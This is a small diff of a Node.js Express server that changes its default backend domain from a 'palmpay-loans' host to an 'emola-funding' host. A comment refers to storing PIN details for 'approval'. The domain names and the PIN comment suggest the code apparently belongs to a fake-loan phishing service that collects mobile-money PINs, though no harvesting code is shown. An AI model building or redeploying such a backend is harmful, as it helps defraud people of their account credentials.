@@ -6,7 +6,7 @@ const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_DOMAIN || 'https://palmpay-loans-8ioh.onrender.com';
+const DOMAIN = process.env.BACKEND_DOMAIN || 'https://emola-funding.onrender.com';
 
 // ---------------- MEMORY STORES ----------------
 // For DETAILS (PIN) approval
